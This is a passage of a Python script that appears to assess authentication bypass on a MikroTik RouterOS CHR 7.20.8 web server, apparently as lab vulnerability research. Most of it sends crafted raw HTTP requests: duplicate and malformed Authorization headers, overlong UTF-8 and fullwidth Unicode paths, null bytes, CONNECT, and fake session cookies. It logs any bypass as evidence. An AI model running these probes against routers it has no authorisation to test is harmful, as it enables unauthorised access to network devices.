                    f"WebSocket/protocol up[REDACTED] request bypasses auth.",
                    cwe="CWE-287", cvss="9.8")
        else:
            ec.add_test(cat, f"Up[REDACTED]: {desc}",
                        f"{desc}", "Connection failed")


# =============================================================================
# Section 12: Double Authorization Header (~6 tests)
# =============================================================================

def test_double_auth_header(ec):
    """Test server behavior with multiple or conflicting Authorization headers."""
    log("=" * 60)
    log("Section 12: Double Authorization Header")
    log("=" * 60)
    cat = "double_auth"

    valid_auth = basic_auth_header(AUTH_USER, AUTH_PASS)
    invalid_auth = basic_auth_header("nonexistent", "wrongpassword")
    empty_auth = basic_auth_header("", "")

    # ── 12.1  Valid + Invalid (valid first)
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: {valid_auth}\r\n"
        f"Authorization: {invalid_auth}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    accepted = status == 200 and body and "uptime" in body.lower()
    ec.add_test(cat, "Double auth: valid first, invalid second",
                "Two Authorization headers: valid then invalid",
                f"Status {status}, accepted={accepted}",
                {"status": status, "body_preview": body[:500],
                 "first_header": "valid", "second_header": "invalid",
                 "accepted": accepted})

    # ── 12.2  Invalid + Valid (invalid first)
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: {invalid_auth}\r\n"
        f"Authorization: {valid_auth}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    accepted = status == 200 and body and "uptime" in body.lower()
    ec.add_test(cat, "Double auth: invalid first, valid second",
                "Two Authorization headers: invalid then valid",
                f"Status {status}, accepted={accepted}",
                {"status": status, "body_preview": body[:500],
                 "first_header": "invalid", "second_header": "valid",
                 "accepted": accepted,
                 "note": "If accepted, server uses LAST header = potential confusion"})

    # ── 12.3  Empty + Valid
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: \r\n"
        f"Authorization: {valid_auth}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    ec.add_test(cat, "Double auth: empty first, valid second",
                "Empty Authorization header followed by valid one",
                f"Status {status}",
                {"status": status, "body_preview": body[:500]})

    # ── 12.4  Bearer token (wrong scheme) + Basic (valid)
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Bearer fake_jwt_token_12345\r\n"
        f"Authorization: {valid_auth}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    ec.add_test(cat, "Double auth: Bearer + Basic",
                "Bearer token header followed by valid Basic header",
                f"Status {status}",
                {"status": status, "body_preview": body[:500]})

    # ── 12.5  Malformed auth header only
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Basic !!!not-base64!!!\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Malformed Basic auth",
                "Authorization: Basic with non-base64 value",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 12.6  Digest auth scheme (unsupported scheme)
    raw_req = (
        f"GET {PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Authorization: Digest username=\"admin\", realm=\"RouterOS\", "
        f"nonce=\"fake\", uri=\"{PROTECTED_PATH}\", response=\"fake\"\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Digest auth scheme",
                "Authorization: Digest with fabricated values",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)


# =============================================================================
# Section 13: Miscellaneous Bypass Vectors (~10+ tests)
# =============================================================================

def test_misc_bypass(ec):
    """Additional creative bypass attempts."""
    log("=" * 60)
    log("Section 13: Miscellaneous Bypass Vectors")
    log("=" * 60)
    cat = "misc_bypass"

    # ── 13.1  Absolute URI in request line
    raw_req = (
        f"GET http://{TARGET}{PROTECTED_PATH} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Absolute URI in request line",
                f"GET http://{TARGET}{PROTECTED_PATH} (absolute URI)",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 13.2  CONNECT tunneling attempt
    raw_req = (
        f"CONNECT {TARGET}:80 HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    ec.add_test(cat, "CONNECT tunnel attempt",
                f"CONNECT {TARGET}:80",
                f"Status {status}",
                {"status": status, "body_preview": body[:500]})

    # ── 13.3  Content-Type confusion: form-urlencoded to REST
    r = http_request("POST", PROTECTED_URL,
                     headers={"Content-Type": "application/x-www-form-urlencoded"},
                     data="username=admin&password=admin",
                     timeout=TIMEOUT)
    if r:
        bypass = is_auth_bypass(r.status_code, r.text)
        ec.add_test(cat, "Form POST with creds in body",
                    f"POST {PROTECTED_PATH} with form-encoded creds (no Basic auth)",
                    result_str(r.status_code, r.text, bypass),
                    {"status": r.status_code, "body_preview": r.text[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)

    # ── 13.4  JSON body with creds (no Authorization header)
    r = http_request("POST", PROTECTED_URL,
                     headers={"Content-Type": "application/json"},
                     data=json.dumps({"user": "admin", "password": "admin"}),
                     timeout=TIMEOUT)
    if r:
        bypass = is_auth_bypass(r.status_code, r.text)
        ec.add_test(cat, "JSON POST with creds in body",
                    f"POST {PROTECTED_PATH} with JSON creds (no Basic auth)",
                    result_str(r.status_code, r.text, bypass),
                    {"status": r.status_code, "body_preview": r.text[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)

    # ── 13.5  Tab character in path
    raw_req = (
        f"GET /rest/system/resource\tHTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Tab in request line",
                "GET with tab between path and HTTP version",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 13.6  Overlong UTF-8 for slash (/../)
    # Overlong encoding of '/' is 0xC0 0xAF
    overlong_path = b"GET /rest\xc0\xafsystem\xc0\xafresource HTTP/1.1\r\nHost: " + \
                    TARGET.encode() + b"\r\nConnection: close\r\n\r\n"
    raw_resp, err = raw_socket_send(overlong_path)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Overlong UTF-8 slash (0xC0 0xAF)",
                "Path with overlong UTF-8 encoding of '/'",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 13.7  Unicode normalization: fullwidth characters
    # Fullwidth 'r' = \uff52, 'e' = \uff45, 's' = \uff53, 't' = \uff54
    fullwidth_path = "/\uff52\uff45\uff53\uff54/system/resource"
    raw_req = (
        f"GET {fullwidth_path} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Fullwidth Unicode path",
                f"GET {fullwidth_path} (Unicode normalization attempt)",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 13.8  Path with null byte mid-path
    raw_req = (
        f"GET /rest/system\x00/resource HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8", errors="replace")
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Null byte in path",
                "GET /rest/system\\x00/resource (null byte truncation)",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass},
                anomaly=bypass)

    # ── 13.9  Long path padding
    padding = "A" * 2048
    raw_req = (
        f"GET /rest/system/resource?{padding} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req, timeout=5)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Long query string padding (2KB)",
                "GET with 2KB query string padding",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass, "query_length": len(padding)},
                anomaly=bypass)

    # ── 13.10  Multiple slashes between path segments
    path = "/" + "/".join([""] * 20) + "rest/system/resource"
    raw_req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    raw_resp, err = raw_socket_send(raw_req)
    status, headers, body = parse_raw_response(raw_resp) if not err else (0, {}, err or "")
    bypass = is_auth_bypass(status, body)
    ec.add_test(cat, "Many leading slashes (20x)",
                f"GET {path[:60]}... without auth",
                result_str(status, body, bypass),
                {"status": status, "body_preview": body[:500],
                 "auth_bypass": bypass, "path": path},
                anomaly=bypass)

    # ── 13.11  Auth to a different path, then request protected path (referer abuse)
    r = http_request("GET", PROTECTED_URL,
                     headers={"Referer": f"http://{TARGET}/webfig/",
                              "Cookie": "session=fake_session_id_12345"},
                     timeout=TIMEOUT)
    if r:
        bypass = is_auth_bypass(r.status_code, r.text)
        ec.add_test(cat, "Fake referer + session cookie",
                    f"GET {PROTECTED_PATH} with fake Referer and session cookie",
                    result_str(r.status_code, r.text, bypass),
                    {"status": r.status_code, "body_preview": r.text[:500],
                     "auth_bypass": bypass},
                    anomaly=bypass)

    # ── 13.12  Request to /webfig/ paths that might leak data without auth
    webfig_paths = [
        "/webfig/",
        "/webfig/#/",
        "/webfig/winbox.cgi",
        "/graphs/",
        "/favicon.ico",
        "/mikrotik_logo.png",
    ]
    for wpath in webfig_paths:
        r = http_request("GET", f"http://{TARGET}{wpath}", timeout=TIMEOUT)
        if r:
            has_data = len(r.text) > 100
            ec.add_test(cat, f"No-auth access: {wpath}",
                        f"GET {wpath} without auth",
                        f"Status {r.status_code}, size={len(r.text)}b",
                        {"path": wpath, "status": r.status_code,
                         "content_length": len(r.text),
                         "content_type": r.headers.get("Content-Type", ""),
                         "body_preview": r.text[:300]})


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — www Auth Bypass Assessment")
    log(f"Target: {TARGET}:{PORT}")
    log(f"Phase 9 — attack_www_auth_bypass.py")
    log("=" * 60)

    # ── Preflight checks ────────────────────────────────────────────────────
    global BASELINE_AUTH_STATUS, BASELINE_NOAUTH_STATUS

    status = check_router_alive()
    if not status.get("alive"):
        log("FATAL: Router is not responding at %s. Aborting." % TARGET)
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, uptime={status.get('uptime')}")

    # Establish baselines
    r_auth = http_request("GET", PROTECTED_URL, auth=AUTH, timeout=TIMEOUT)
    r_noauth = http_request("GET", PROTECTED_URL, timeout=TIMEOUT)

    if r_auth:
        BASELINE_AUTH_STATUS = r_auth.status_code
        log(f"Baseline (authenticated):   GET {PROTECTED_PATH} -> {r_auth.status_code}")
    else:
        log(f"WARNING: Cannot reach {PROTECTED_URL} even with auth")

    if r_noauth:
        BASELINE_NOAUTH_STATUS = r_noauth.status_code
        log(f"Baseline (unauthenticated): GET {PROTECTED_PATH} -> {r_noauth.status_code}")
    else:
        log("WARNING: Cannot connect without auth (may be expected)")

    if BASELINE_AUTH_STATUS != 200:
        log("WARNING: Authenticated request did not return 200. Proceeding anyway.")

    # ── Initialize evidence collector ─────────────────────────────────────────
    ec = EvidenceCollector("attack_www_auth_bypass.py", phase=9)

    ec.add_test("baseline", "Authenticated baseline",
                f"GET {PROTECTED_PATH} with valid credentials",
                f"Status {BASELINE_AUTH_STATUS}",
                {"status": BASELINE_AUTH_STATUS,
                 "body_preview": r_auth.text[:300] if r_auth else "(none)"})

    ec.add_test("baseline", "Unauthenticated baseline",
                f"GET {PROTECTED_PATH} without credentials",
                f"Status {BASELINE_NOAUTH_STATUS}",
                {"status": BASELINE_NOAUTH_STATUS,
                 "body_preview": r_noauth.text[:300] if r_noauth else "(none)"})

    test_count = 0

    try:
        # Section 1: HTTP Verb Tampering (~11 tests)
        test_http_verb_tampering(ec)
        test_count += 11
        health_check(ec, f"after_section_1 (tests={test_count})")

        # Section 2: Path Normalization Bypass (~10 tests)
        test_path_normalization(ec)
        test_count += 10
        health_check(ec, f"after_section_2 (tests={test_count})")

        # Section 3: URL Encoding of Path (~8 tests)
        test_url_encoding(ec)
        test_count += 8

        # Section 4: Host Header Manipulation (~7 tests)
        test_host_header(ec)
        test_count += 7
        health_check(ec, f"after_section_4 (tests={test_count})")

        # Section 5: X-Forwarded-For / Proxy Header Injection (~8 tests)
        test_forwarded_headers(ec)
        test_count += 8

        # Section 6: HTTP Version Down[REDACTED] (~4 tests)
        test_http_version_down[REDACTED](ec)
        test_count += 4
        health_check(ec, f"after_section_6 (tests={test_count})")

        # Section 7: Request Smuggling (~8 tests)
        test_request_smuggling(ec)
        test_count += 8

        # Section 8: Connection Auth State Inheritance (~6 tests)
        test_connection_auth_state(ec)
        test_count += 6
        health_check(ec, f"after_section_8 (tests={test_count})")

        # Section 9: Partial URL / Path Confusion (~8 tests)
        test_partial_url_matching(ec)
        test_count += 8

        # Section 10: Method Case Sensitivity (~10 tests)
        test_method_case_sensitivity(ec)
        test_count += 10
        health_check(ec, f"after_section_10 (tests={test_count})")

        # Section 11: WebSocket Up[REDACTED] on REST (~4 tests)
        test_websocket_up[REDACTED](ec)
        test_count += 4

        # Section 12: Double Authorization Header (~6 tests)
        test_double_auth_header(ec)
        test_count += 6
        health_check(ec, f"after_section_12 (tests={test_count})")

        # Section 13: Miscellaneous Bypass Vectors (~10+ tests)
        test_misc_bypass(ec)
        test_count += 18

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled error: {e}")
        traceback.print_exc()

    # ── Final summary ─────────────────────────────────────────────────────────
    log("")
    log("=" * 60)
    log("SUMMARY")
    log("=" * 60)

    total_tests = ec.results["metadata"]["total_tests"]
    total_anomalies = ec.results["metadata"]["anomalies"]
    total_findings = len(ec.results["findings"])

    log(f"Total tests executed: {total_tests}")
    log(f"Anomalies detected:  {total_anomalies}")
    log(f"Findings:            {total_findings}")

    if total_findings > 0:
        log("")
        log("FINDINGS:")
        for f in ec.results["findings"]:
            log(f"  [{f['severity']}] {f['title']}")
    else:
        log("No authentication bypass vulnerabilities found.")
        log("The www binary correctly enforces authentication across all tested vectors.")

    # Category breakdown
    categories = {}
    for t in ec.results["tests"]:
        c = t.get("category", "unknown")
        if c not in categories:
            categories[c] = {"total": 0, "anomalies": 0}
        categories[c]["total"] += 1
        if t.get("anomaly"):
            categories[c]["anomalies"] += 1

    log("")
    log("Category Breakdown:")
    log(f"  {'Category':<30} {'Tests':>6} {'Anomalies':>10}")
    log(f"  {'-'*30} {'-'*6} {'-'*10}")
    for c, info in sorted(categories.items()):
        log(f"  {c:<30} {info['total']:>6} {info['anomalies']:>10}")

    # Save evidence
    ec.save("attack_www_auth_bypass.json")
    ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
